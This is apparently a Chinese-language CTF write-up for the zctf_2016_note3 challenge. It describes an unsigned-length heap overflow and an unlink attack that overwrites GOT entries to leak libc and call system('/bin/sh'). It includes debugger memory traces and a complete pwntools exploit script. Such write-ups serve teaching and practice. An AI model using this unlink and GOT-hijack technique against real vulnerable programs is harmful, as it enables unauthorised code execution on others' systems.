# 漏洞成因
## 程序关键结构体
程序使用全局变量 `ptr`（地址 `0x6020c8`）作为一个指针数组，最多存储7个由 `malloc` 分配的堆块地址。相邻的 `qword_6020C0`（地址 `0x6020c0`）数组用于存储对应堆块的大小。其中 `qword_6020C0[0]` 作为一个游标，始终指向最新被操作（添加或编辑）的堆块地址。

## 漏洞定位
漏洞位于 `sub_4008DD` 函数（用于读取输入）中。当调用该函数时，若传入的 `a2`（长度参数）为 `0`，则由于 `i` 为无符号整数，循环条件 `a2 - 1 > i` 将恒成立（`0-1` 溢出为最大值），导致可以向目标地址 `a1` 进行无限制的写入，造成堆溢出。
```c
unsigned __int64 __fastcall sub_4008DD(__int64 a1, __int64 a2, char a3)
{
  ...
  for ( i = 0; a2 - 1 > i; ++i )  // 当 a2 == 0 时，条件恒成立
  {
    ...
    *(_BYTE *)(i + a1) = buf;     // 可无限写入
  }
  ...
}
```

# 漏洞利用过程：
利用思路是通过堆溢出伪造堆块，触发 `unlink` 修改 `ptr` 数组中的指针，使其指向 `free@got` 和 `atoi@got`。随后将 `free@got` 改为 `puts@plt`，通过 `delete` 操作（实际调用 `puts`）泄露 `atoi` 的地址，从而计算出 `libc` 基址和 `system` 地址。最后将 `atoi@got` 改为 `system`，传入 `/bin/sh` 即可获得shell。

- Step1: 分配四个堆块 (idx 0, 1, 2, 3)，为后续的溢出和 `unlink` 做准备。
- Step2: 通过 `edit` idx0，利用堆溢出漏洞修改后续堆块的元数据，在 idx2 的 `user data` 区域伪造一个 `free` 状态的堆块，并设置好其 `fd` 和 `bk` 指针以通过 `unlink` 检查。
- Step3: 调用 `delete(1)`，触发 `unlink`。`unlink` 宏会将伪造堆块从双向链表中摘除，其核心操作 `*(fake_chunk->bk + 0x18) = fake_chunk->fd` 会导致 `ptr[2]` 被修改为 `&ptr - 0x8` (即 `0x6020c0`)。
- Step4: 此时 `edit(2)` 可以修改 `0x6020c0` 开始的 `ptr` 数组。通过构造 `payload`，将 `ptr[0]` 覆盖为 `free@got`，将 `ptr[2]` 和 `ptr[3]` 覆盖为 `atoi@got`。
- Step5: `edit(0)` 向 `ptr[0]` 指向的地址（即 `free@got`）写入 `puts@plt` 的地址，完成 `got` 表劫持。
- Step6: `delete(2)`。此时程序会调用 `free(ptr[2])`，但由于 `free@got` 已被修改为 `puts@plt`，实际执行的是 `puts(atoi@got)`，从而泄露 `libc` 中 `atoi` 的地址。
- Step7: 根据泄露的地址计算 `libc` 基址和 `system` 地址，然后通过 `edit(3)` 向 `ptr[3]` 指向的地址（即 `atoi@got`）写入 `system` 的地址。
- Step8 & Step9: 程序主循环会调用 `atoi` 处理我们的菜单选择输入。此时 `atoi` 已被替换为 `system`，发送 `/bin/sh` 即可获得 shell。

## Step1
- 堆内存 `0x29a04010` 处，分配了大小为 `0x20` 的 chunk0，用于后续的溢出。
- 堆内存 `0x29a04030`, `0x29a04140`, `0x29a04250` 处，分别分配了三个大小为 `0x110` 的堆块 (chunk1, chunk2, chunk3)。
- BSS 段 `0x6020c8` (`ptr` 数组) 处，内容由空变为 `0x29a04010 0x29a04030 0x29a04140 0x29a04250`，依次存储了四个堆块的地址。

## Step2
（此步骤为向 chunk0 写入构造好的 payload，调试记录未捕获具体堆变化，但 payload 已写入内存）

## Step3
此步骤触发了 `unlink`，内存发生关键变化：
- 堆内存 `0x29a04020` (chunk0+0x10) 处，chunk0 的 `size` 字段被我们通过溢出修改为 `0x221`，并与被释放的 chunk1 合并，形成了一个 `unsorted bin`。其 `fd`/`bk` 指向 `main_arena` (`0x74e070d69b78`)。
- 堆内存 `0x29a04140` (chunk2 的 `user data` 起始处) 处，是我们伪造的 `free chunk`。其 `size` 为 `0x101`，`fd` 为 `0x6020c0`，`bk` 为 `0x6020c8`。
- BSS 段 `0x6020c8` (`ptr` 数组) 处，`ptr[1]` 被 `free` 置零，`ptr[2]` 的内容由 `0x29a04140` 变为 `0x6020c0`。这正是 `unlink` 操作 `*(fake_chunk->bk + 0x18) = fake_chunk->fd` 的结果：`fake_chunk->bk` 是 `0x6020c8`，`+0x18` 即 `0x6020e0`，对应 `ptr[2]` 的存储位置；`fake_chunk->fd` 是 `0x6020c0`。因此，现在 `edit(2)` 可以修改从 `0x6020c0` 开始的内存。

## Step4
- BSS 段 `0x6020c0` 开始的内存被修改。`edit(2)` 向 `ptr[2]` 指向的地址 (`0x6020c0`) 写入 `payload`。
- `0x6020c8` (`ptr[0]`) 被覆盖为 `free@got (0x602018)`。
- `0x6020d8` (`ptr[2]`) 和 `0x6020e0` (`ptr[3]`) 被覆盖为 `atoi@got (0x602070)`。

## Step5
- `.got.plt` 段 `0x602018` (`free@got`) 处，内容由原来的 `free` 函数地址 (`0x74e070a29540`) 被修改为 `puts@plt` 的地址 (`0x400730`)。

## Step6
- 程序调用 `delete(2)`，实际执行 `puts(atoi@got)`，输出 `atoi` 在 `libc` 中的地址。
- 控制台接收到泄露的地址，并计算出 `libc` 基址和 `system` 地址。

## Step7
- `.got.plt` 段 `0x602070` (`atoi@got`) 处，内容由原来的 `atoi` 函数地址 (`0x74e0709ea3a0`) 被修改为 `system` 的地址 (`0x74e0709ea3a0` 经过计算后得到的 `system` 地址)。

## Step8 & Step9
- 程序主循环调用 `atoi` 处理输入 `/bin/sh`，由于 `atoi@got` 指向 `system`，因此实际执行 `system("/bin/sh")`，成功获得 shell。

# Exploit：
```python
from pwn import *

context(log_level = 'debug', arch = 'amd64', os = 'linux')

io = process('./zctf_2016_note3')
# io = remote('node4.buuoj.cn', 26242)
# gdb.attach(io)

elf = ELF('./zctf_2016_note3')
libc = ELF('./libc-2.23.so')

def new(size, content):
    io.recvuntil(b'>>\n')
    io.sendline(b'1')
    io.recvuntil(b'1024)\n')
    io.sendline(size)
    io.recvuntil(b'content:\n')
    io.sendline(content)

def show():
    io.recvuntil(b'>>\n')
    io.sendline(b'2')

def edit(idx, content):
    io.recvuntil(b'>>\n')
    io.sendline(b'3')
    io.recvuntil(b'note:\n')
    io.sendline(idx)
    io.recvuntil(b'content:\n')
    io.sendline(content)

def delete(idx):
    io.recvuntil(b'>>\n')
    io.sendline(b'4')
    io.recvuntil(b'note:\n')
    io.sendline(idx)

ptr = 0x6020C8

# Step 1: 分配初始堆块
new(b'0', b'aaaa')      # idx 0, size=0，利用漏洞进行无限制写入
new(b'256', b'aaaa')    # idx 1, size=0x110
new(b'256', b'aaaa')    # idx 2, size=0x110，用于伪造fake chunk
new(b'256', b'aaaa')    # idx 3, size=0x110

# Step 2: 构造payload，利用idx0溢出修改后续堆块元数据，在idx2处伪造free chunk
# fd 和 bk 需要满足 unlink 检查: (P->fd)->bk == P && (P->bk)->fd == P
# 我们想让 unlink 后 ptr[2] = &ptr - 0x8 (即0x6020c0)
fd = ptr + 0x10 - 0x18  # 0x6020c0, 对应伪造chunk的fd
bk = ptr + 0x10 - 0x10  # 0x6020c8, 对应伪造chunk的bk

payload = p64(0) * 3 + p64(0x121)         # 填充chunk0并修改chunk1的size为0x121
payload += b'a' * 0x110                    # 填满chunk1的user data
payload += p64(0) + p64(0x101)            # 伪造chunk的prev_size和size (位于chunk2的user data)
payload += p64(fd) + p64(bk)              # 伪造chunk的fd和bk指针
payload += b'a' * (0x100 - 0x20)           # 填充伪造chunk剩余部分
payload += p64(0x100) + p64(0x110)        # 修改chunk3的prev_size和prev_inuse位
edit(b'0', payload)

# Step 3: 释放chunk1，触发unlink，合并chunk1和伪造的chunk
delete(b'1')
# unlink后，ptr[2] 变为 0x6020c0

free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_plt = elf.plt['puts']

# Step 4: 利用ptr[2]指向0x6020c0，修改ptr数组内容
payload = b'a' * 0x8                      # 填充0x6020c0开始的8字节（对应qword_6020C0[0]）
payload += p64(free_got) + p64(0)         # ptr[0]=free_got, ptr[1]=0 (已被free)
payload += p64(atoi_got) + p64(atoi_got)  # ptr[2]=atoi_got, ptr[3]=atoi_got
edit(b'2', payload)

# Step 5: 修改free@got为puts@plt
edit(b'0', p64(puts_plt)[:-1])            # [:-1] 因为edit会补\x00

# Step 6: 调用delete(2) -> puts(atoi_got) 泄露libc地址
delete(b'2')
atoi_addr = u64(io.recvline()[:-1].ljust(8, b'\x00'))
print('atoi_addr -> ' + hex(atoi_addr))

# 计算system地址
libc_addr = atoi_addr - libc.symbols['atoi']
system_addr = libc.symbols['system'] + libc_addr

# Step 7: 修改atoi@got为system地址
edit(b'3', p64(system_addr)[:-1])

# Step 8 & 9: 触发system("/bin/sh")
io.recvuntil(b'>>\n')
io.sendline(b'/bin/sh')

io.interactive()
```
